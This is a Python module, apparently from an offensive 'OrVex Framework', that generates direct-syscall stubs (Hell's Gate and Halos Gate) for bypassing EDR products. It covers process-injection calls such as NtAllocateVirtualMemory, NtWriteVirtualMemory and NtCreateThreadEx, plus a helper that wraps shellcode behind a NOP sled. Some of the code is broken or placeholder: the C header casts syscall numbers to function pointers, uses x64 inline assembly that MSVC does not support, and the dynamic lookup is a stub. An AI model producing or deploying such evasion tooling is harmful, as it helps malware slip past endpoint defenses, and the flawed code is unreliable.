#!/usr/bin/env python3
"""
Direct Syscalls Evasion Technique
- Hell's Gate implementation
- Halos Gate (pour contourner les hooks)
- Syscall stubs generator
"""

import struct
from typing import Dict, List, Optional

class SyscallManager:
    """
    Générateur d'appels système directs pour contourner les EDR
    Implémente Hell's Gate et Halos Gate
    """
    
    # Syscall numbers pour Windows 10/11 (x64)
    # Ces valeurs changent selon les versions, à ajuster dynamiquement
    SYSCALL_STUBS = {
        "NtAllocateVirtualMemory": 0x18,
        "NtProtectVirtualMemory": 0x50,
        "NtCreateThreadEx": 0xC1,
        "NtWaitForSingleObject": 0x04,
        "NtOpenProcess": 0x26,
        "NtWriteVirtualMemory": 0x3A,
        "NtReadVirtualMemory": 0x3F,
        "NtClose": 0x0F,
        "NtCreateFile": 0x55,
        "NtDeviceIoControlFile": 0x07,
    }
    
    @staticmethod
    def generate_syscall_stub(function_name: str) -> bytes:
        """
        Génère le stub assembleur pour un syscall
        Format: mov r10, rcx; mov eax, ssn; syscall; ret
        """
        if function_name not in SyscallManager.SYSCALL_STUBS:
            raise ValueError(f"Unknown syscall: {function_name}")
        
        ssn = SyscallManager.SYSCALL_STUBS[function_name]
        
        # Assembleur x64 :
        # 4C 8B D1     - mov r10, rcx
        # B8 XX XX 00 00 - mov eax, ssn
        # 0F 05        - syscall
        # C3           - ret
        
        code = bytearray()
        code.extend([0x4C, 0x8B, 0xD1])  # mov r10, rcx
        code.extend([0xB8])  # mov eax, imm32
        code.extend(struct.pack('<I', ssn))  # syscall number
        code.extend([0x0F, 0x05])  # syscall
        code.append(0xC3)  # ret
        
        return bytes(code)
    
    @staticmethod
    def generate_c_header() -> str:
        """Génère un header C avec tous les syscalls"""
        header = """// Auto-generated Syscall Stubs - OrVex Framework
// Technique: Hell's Gate (Direct Syscalls)
#pragma once
#include <windows.h>

// Syscall function typedefs
"""
        for func in SyscallManager.SYSCALL_STUBS:
            header += f"typedef NTSTATUS (NTAPI *p{func})(...);\n"
        
        header += "\n// Syscall stubs (inline assembly)\n"
        header += """
#ifdef _WIN64
#define SYSCALL_STUB(name, ssn) \\
    __asm { \\
        mov r10, rcx \\\\
        mov eax, ssn \\\\
        syscall \\\\
        ret \\\\
    }
#else
// x86 not supported for direct syscalls
#endif

// Function pointers
"""
        for func, ssn in SyscallManager.SYSCALL_STUBS.items():
            header += f"p{func} {func.replace('Nt', 'Sys')} = (p{func}){hex(ssn)};\n"
        
        return header
    
    @staticmethod
    def wrap_shellcode(shellcode: bytes) -> bytes:
        """Enveloppe le shellcode avec des syscalls"""
        # Ajoute un prologue pour appeler les syscalls
        prologue = b"\x90" * 16  # NOP sled
        return prologue + shellcode


class HalosGate(SyscallManager):
    """
    Halos Gate - Trouve dynamiquement les syscall numbers
    en analysant ntdll.dll en mémoire
    """
    
    @staticmethod
    def find_syscall_numbers() -> Dict[str, int]:
        """
        Recherche dynamique des syscall numbers
        À implémenter avec du parsing PE
        """
        # Cette fonction analyserait ntdll.dll en mémoire
        # pour trouver les vrais syscall numbers
        return SyscallManager.SYSCALL_STUBS.copy()


# Export principal
__all__ = ['SyscallManager', 'HalosGate']